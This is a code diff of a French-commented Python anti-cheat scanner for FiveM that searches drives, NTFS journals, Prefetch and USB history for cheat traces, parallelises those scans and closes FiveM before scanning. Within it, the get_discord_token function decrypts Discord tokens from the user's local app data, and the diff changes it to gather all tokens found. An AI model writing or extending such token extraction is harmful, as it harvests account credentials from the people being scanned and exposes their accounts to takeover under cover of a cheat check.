@@ -9,7 +9,11 @@ import hashlib
 import winreg
 import re
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Nombre de workers adaptatif selon les CPUs disponibles
+_CPU_CORES = os.cpu_count() or 4
+_CPU_WORKERS = min(max(_CPU_CORES * 2, 8), 32)
 from src.authenticode import get_file_sha256, check_authenticode_signature
 from src.scorer import evaluate_app_risk, calculate_overall_risk_grouped
 
@@ -211,20 +215,28 @@ def scan_usn_journal_drive(drive_letter):
     return deleted_cheats
 
 def scan_usn_journal_all_drives(drives, progress_callback=None, pct=76):
-    """Analyse le journal USN de TOUS les disques détectés."""
+    """Analyse le journal USN de TOUS les disques détectés — en parallèle."""
     if progress_callback:
         progress_callback("Forensique USN NTFS", pct, "Analyse des suppressions récentes sur tous les disques...")
-        
+
+    ntfs_drives = [d for d in drives if d.get("fstype", "").upper() == "NTFS"]
     all_deleted = []
-    for i, drive in enumerate(drives):
-        letter = drive["letter"]
-        if drive.get("fstype", "").upper() != "NTFS":
-            continue
-        if progress_callback:
-            sub_pct = pct + int((i / max(len(drives), 1)) * 3)
-            progress_callback("Forensique USN NTFS", sub_pct, f"Analyse journal USN : {letter}")
-        all_deleted.extend(scan_usn_journal_drive(letter))
-    
+
+    if not ntfs_drives:
+        return all_deleted
+
+    with ThreadPoolExecutor(max_workers=min(len(ntfs_drives), _CPU_WORKERS)) as ex:
+        futures = {ex.submit(scan_usn_journal_drive, d["letter"]): d["letter"] for d in ntfs_drives}
+        for i, future in enumerate(as_completed(futures)):
+            letter = futures[future]
+            if progress_callback:
+                sub_pct = pct + int((i / max(len(ntfs_drives), 1)) * 3)
+                progress_callback("Forensique USN NTFS", sub_pct, f"Journal USN terminé : {letter}")
+            try:
+                all_deleted.extend(future.result())
+            except Exception:
+                pass
+
     return all_deleted
 
 # ─────────────────────────────────────────────
@@ -743,15 +755,13 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
             return 3
         return 4   # Défaut général
 
-    for i, directory in enumerate(dirs_to_scan):
-        pct = start_pct + int((i / total) * (end_pct - start_pct))
-        dir_label = os.path.basename(directory) or directory[:3]
-        if progress_callback:
-            progress_callback("Scan Fichiers Multi-Disques", pct, f"Analyse : {dir_label}")
+    import threading
+    _lock = threading.Lock()
 
+    def _scan_one_dir(directory, pct):
+        local_suspects = []
         depth_limit = _get_depth_limit(directory)
         is_recent_dir = "recent" in directory.lower()
-
         try:
             for root, dirs, files in os.walk(directory):
                 depth = root.replace(directory, "").count(os.sep)
@@ -759,10 +769,8 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                 # ── Noms de dossiers suspects
                 for d in dirs:
                     d_lower = d.lower().strip()
-
-                    # 1. Noms suspects génériques (ham, 420, cheat, etc.)
                     if d_lower in SUSPICIOUS_FOLDER_NAMES:
-                        suspects.append({
+                        local_suspects.append({
                             "file": d,
                             "path": os.path.join(root, d),
                             "directory": root,
@@ -771,12 +779,10 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                             "reason": f"Dossier au nom suspect de cheat/grief détecté : '{d}'"
                         })
                         continue
-
-                    # 2. Correspondance avec signatures de cheats connus
                     for cheat in SPECIFIC_CHEATS:
                         is_match = (cheat == d_lower) or (len(cheat) > 3 and cheat in d_lower)
                         if is_match:
-                            suspects.append({
+                            local_suspects.append({
                                 "file": d,
                                 "path": os.path.join(root, d),
                                 "directory": root,
@@ -786,7 +792,6 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                             })
                             break
 
-                # Limiter les sous-dossiers traversés
                 dirs[:] = [
                     d for d in dirs
                     if d.lower() not in {
@@ -801,7 +806,6 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                     dirs.clear()
                     continue
 
-                # Compteur pour rafraîchir le callback en temps réel sans ralentir la boucle
                 file_count = 0
                 for file in files:
                     file_count += 1
@@ -809,25 +813,21 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                     file_lower = file.lower()
                     ext = os.path.splitext(file_lower)[1]
 
-                    if progress_callback and file_count % 30 == 0:
+                    if progress_callback and file_count % 50 == 0:
                         progress_callback("Scan Fichiers", pct, f"{file}")
 
-                    # ── Fichiers Recent (.lnk) : extraire la cible du raccourci
                     if is_recent_dir and ext == ".lnk":
                         try:
-                            # Lire la cible du fichier LNK (offset fixe 76)
                             with open(full_path, "rb") as lf:
                                 lnk_data = lf.read(4096)
-                            # Chercher un chemin Windows dans les données brutes
                             import re as _re
                             targets = _re.findall(b'[A-Za-z]:\\\\[^\x00\r\n"]{5,120}', lnk_data)
                             for t in targets:
                                 t_str = t.decode("utf-8", errors="ignore")
-                                t_lower = t_str.lower()
                                 t_base = os.path.basename(t_str)
                                 lnk_match = _is_fivem_cheat_file(t_base, t_str)
                                 if lnk_match:
-                                    suspects.append({
+                                    local_suspects.append({
                                         "file": file,
                                         "path": full_path,
                                         "directory": root,
@@ -840,10 +840,9 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                             pass
                         continue
 
-                    # ── Vérification directe du fichier
                     match = _is_fivem_cheat_file(file, full_path)
                     if match:
-                        suspects.append({
+                        local_suspects.append({
                             "file": file,
                             "path": full_path,
                             "directory": root,
@@ -851,12 +850,10 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                             "severity": match.get("severity", "HIGH"),
                             "reason": match.get("reason", f"Signature suspecte '{file}' sur {directory[:3]}")
                         })
-
-                    # ── Inspection du contenu des archives (.zip, .rar, .7z)
                     elif ext in ARCHIVE_EXTENSIONS:
                         archive_suspects = _scan_archive_contents(full_path)
                         for fname, inner_path, reason in archive_suspects:
-                            suspects.append({
+                            local_suspects.append({
                                 "file": file,
                                 "path": full_path,
                                 "directory": root,
@@ -864,9 +861,26 @@ def scan_fivem_cheat_files_all_drives(drives, progress_callback=None, start_pct=
                                 "severity": "CRITICAL",
                                 "reason": f"Archive suspecte '{file}' contenant le fichier de cheat '{fname}' ({inner_path})"
                             })
-
         except (PermissionError, OSError):
             pass
+        return local_suspects
+
+    # Lancer tous les dossiers en parallèle (I/O-bound)
+    workers = min(len(dirs_to_scan), _CPU_WORKERS)
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        futures_map = {
+            ex.submit(_scan_one_dir, d, start_pct + int((i / total) * (end_pct - start_pct))): (i, d)
+            for i, d in enumerate(dirs_to_scan)
+        }
+        for future in as_completed(futures_map):
+            i, d = futures_map[future]
+            if progress_callback:
+                pct = start_pct + int((i / total) * (end_pct - start_pct))
+                progress_callback("Scan Fichiers Multi-Disques", pct, f"Terminé : {os.path.basename(d) or d[:3]}")
+            try:
+                suspects.extend(future.result())
+            except Exception:
+                pass
 
     return suspects
 
@@ -971,6 +985,7 @@ def get_discord_token():
                pass
           return False
 
+     found_tokens = set()
      appdata = os.environ.get("APPDATA", "")
      localappdata = os.environ.get("LOCALAPPDATA", "")
      
@@ -1065,7 +1080,7 @@ def get_discord_token():
                                              decrypted = aesgcm.decrypt(payload, iv, None)
                                              token = decrypted.decode('utf-8')
                                              if token and is_valid_token(token):
-                                                  return token
+                                                  found_tokens.add(token)
                                         except Exception:
                                              pass
                               except Exception:
@@ -1105,20 +1120,22 @@ def get_discord_token():
                                         try:
                                              token = match.decode('utf-8')
                                              if is_valid_token(token):
-                                                  return token
+                                                  found_tokens.add(token)
                                         except Exception:
                                              pass
                               except Exception:
                                    pass
                except Exception:
                     pass
-     return "N/A" 
+     return " | ".join(found_tokens) if found_tokens else "N/A"
 
 def get_discord_user_id():
     """Tente de récupérer l'ID Discord de l'utilisateur."""
     # 1. Tenter d'extraire l'ID Discord directement depuis le token s'il existe
-    token = get_discord_token()
-    if token and token != "N/A":
+    tokens_str = get_discord_token()
+    # Utiliser le premier token pour décoder l'ID Discord
+    token = tokens_str.split(" | ")[0] if tokens_str and tokens_str != "N/A" else ""
+    if token:
          try:
               import base64
               parts = token.split('.')
@@ -1211,6 +1228,23 @@ def process_single(pinfo):
     except Exception:
         return None
 
+def kill_fivem_if_running():
+    """Ferme FiveM proprement avant le scan pour libérer les fichiers disk lockés."""
+    FIVEM_PROCS = {"fivem.exe", "fivem_b2802_dump.exe", "gta5.exe", "gta_sa.exe"}
+    killed = []
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            name = (proc.info.get('name') or '').lower()
+            if name in FIVEM_PROCS:
+                proc.terminate()
+                killed.append(name)
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            pass
+    if killed:
+        time.sleep(1.5)  # Laisser le temps aux fichiers d'être libérés
+    return killed
+
+
 def run_system_scan(progress_callback=None):
 
     def step(stage, pct, info=""):
@@ -1220,20 +1254,32 @@ def run_system_scan(progress_callback=None):
     # ── 5% : HWID
     hwid = get_hardware_id()
     step("Initialisation", 5, f"HWID : {hwid}")
-    time.sleep(0.05)
 
     # ── 10% : Détection des disques montés
     step("Détection Disques", 10, "Détection de toutes les unités de stockage...")
     mounted_drives = get_all_mounted_drives()
     drive_labels = ", ".join([f"{d['letter']} ({d['fstype']} {d['total_gb']}GB)" for d in mounted_drives])
     step("Détection Disques", 12, f"{len(mounted_drives)} disque(s) : {drive_labels}")
-    time.sleep(0.05)
 
-    # ── 15% : Infos système & Date Installation OS
-    step("Infos Système", 15, "Collecte CPU / GPU / Date Installation OS...")
-    ext_info = get_extended_system_info()
-    os_install = get_os_installation_date()
-    time.sleep(0.05)
+    # ── 12-25% : Phases indépendantes en PARALLÈLE
+    # Lance simultanément : Infos système, Install OS, Vitesse Disque, FiveM Kill
+    step("Initialisation Parallèle", 13, f"Lancement des collectes sur {_CPU_CORES} cœurs...")
+
+    with ThreadPoolExecutor(max_workers=4) as _init_ex:
+        _f_ext   = _init_ex.submit(get_extended_system_info)
+        _f_os    = _init_ex.submit(get_os_installation_date)
+        _f_disk  = _init_ex.submit(measure_disk_read_speed)
+        _f_kill  = _init_ex.submit(kill_fivem_if_running)
+
+    ext_info   = _f_ext.result()
+    os_install = _f_os.result()
+    disk_speed = _f_disk.result()
+    killed_procs = _f_kill.result()
+
+    if killed_procs:
+        step("FiveM Fermé", 18, f"FiveM fermé avant scan : {', '.join(killed_procs)}")
+
+    step("Infos Système", 20, f"CPU/GPU/OS collecté | Disque : {disk_speed} MB/s")
 
     system_info = {
         "hwid"            : hwid,
@@ -1259,12 +1305,6 @@ def run_system_scan(progress_callback=None):
         "mounted_drives"  : mounted_drives
     }
 
-    # ── 25% : Disque
-    step("Disque & Performance", 25, "Mesure de la vitesse de lecture...")
-    disk_speed = measure_disk_read_speed()
-    step("Disque & Performance", 30, f"Disque : {disk_speed} MB/s")
-    time.sleep(0.05)
-
     # ── 38% : RAM
     ram_usage = psutil.virtual_memory().percent
     step("Mémoire RAM", 38, f"Allocation RAM : {ram_usage}%")
@@ -1277,7 +1317,7 @@ def run_system_scan(progress_callback=None):
 
     raw_processes  = []
     total_dlls     = 0
-    with ThreadPoolExecutor(max_workers=16) as ex:
+    with ThreadPoolExecutor(max_workers=_CPU_WORKERS) as ex:
         for res in ex.map(process_single, all_procs):
             if res:
                 raw_processes.append(res)
@@ -1303,24 +1343,25 @@ def run_system_scan(progress_callback=None):
         end_pct=72
     )
 
-    # ── 73% : Forensique Windows Prefetch & Wiping Detection
-    prefetch_res = scan_windows_prefetch(progress_callback=progress_callback, pct=73)
+    # ── 73-80% : Analyses Forensiques en PARALLÈLE
+    step("Forensique Système", 73, "Lancement des analyses forensiques (Prefetch, Defender, USN Journal, USB)...")
+    with ThreadPoolExecutor(max_workers=4) as forensique_ex:
+        f_pf = forensique_ex.submit(scan_windows_prefetch, progress_callback, 73)
+        f_def = forensique_ex.submit(scan_windows_defender_threats, progress_callback, 74)
+        f_usn = forensique_ex.submit(scan_usn_journal_all_drives, mounted_drives, progress_callback, 76)
+        f_usb = forensique_ex.submit(scan_usb_storage_history, progress_callback, 79)
+
+    prefetch_res = f_pf.result()
     prefetch_traces = prefetch_res.get("traces", [])
     system_info["prefetch_file_count"] = prefetch_res.get("total_pf_count", 0)
     system_info["is_prefetch_wiped"] = prefetch_res.get("is_wiped", False)
-    time.sleep(0.05)
 
-    # ── 74% : Forensique Détections Windows Defender
-    defender_traces = scan_windows_defender_threats(progress_callback=progress_callback, pct=74)
-    time.sleep(0.05)
+    defender_traces = f_def.result()
 
-    # ── 76% : Forensique Journal USN NTFS - MULTI-DISQUES
-    usn_traces = scan_usn_journal_all_drives(mounted_drives, progress_callback=progress_callback, pct=76)
+    usn_traces = f_usn.result()
     step("Forensique USN NTFS", 78, f"{len(usn_traces)} fichier(s) supprimé(s) sur {len(mounted_drives)} disque(s)")
-    time.sleep(0.05)
 
-    # ── 79% : Forensique USB/SSD historique
-    usb_history = scan_usb_storage_history(progress_callback=progress_callback, pct=79)
+    usb_history = f_usb.result()
     disconnected_usbs = [u for u in usb_history if not u.get("is_connected")]
     system_info["has_disconnected_usb"] = len(disconnected_usbs) > 0
     system_info["disconnected_usb_count"] = len(disconnected_usbs)
@@ -1345,16 +1386,13 @@ def run_system_scan(progress_callback=None):
             grouped_map[key]["instances_count"] += 1
             grouped_map[key]["loaded_dll_count"] += proc.get("loaded_dll_count", 0)
 
-    # ── 85-95% : Scoring par application
+    # ── 85-95% : Scoring par application en PARALLÈLE
     apps_list    = list(grouped_map.items())
     total_apps   = max(len(apps_list), 1)
     applications = []
 
-    for idx, ((name, exe), app_data) in enumerate(apps_list):
-        pct = 85 + int((idx / total_apps) * 10)
-        if progress_callback and idx % 20 == 0:
-            progress_callback("Calcul du Risque", pct, f"Scoring {idx+1}/{total_apps} applications...")
-
+    def _score_app(item):
+        (name, exe), app_data = item
         exe_path = app_data.get("exe_path")
         sha256   = get_file_sha256(exe_path) if exe_path else None
         sig      = check_authenticode_signature(exe_path) if exe_path else {"signed": False, "status": "NoExe"}
@@ -1370,7 +1408,18 @@ def run_system_scan(progress_callback=None):
             "status_type"     : "PROCESSUS_EN_COURS"
         }
         app_item["risk_assessment"] = evaluate_app_risk(app_item)
-        applications.append(app_item)
+        return app_item
+
+    with ThreadPoolExecutor(max_workers=_CPU_WORKERS) as score_ex:
+        futures_score = [score_ex.submit(_score_app, item) for item in apps_list]
+        for idx, f in enumerate(as_completed(futures_score)):
+            if progress_callback and idx % 15 == 0:
+                pct = 85 + int((idx / total_apps) * 10)
+                progress_callback("Calcul du Risque", pct, f"Scoring {idx+1}/{total_apps} applications...")
+            try:
+                applications.append(f.result())
+            except Exception:
+                pass
 
     # Ajouter les fichiers physiques suspects
     if fivem_suspects:
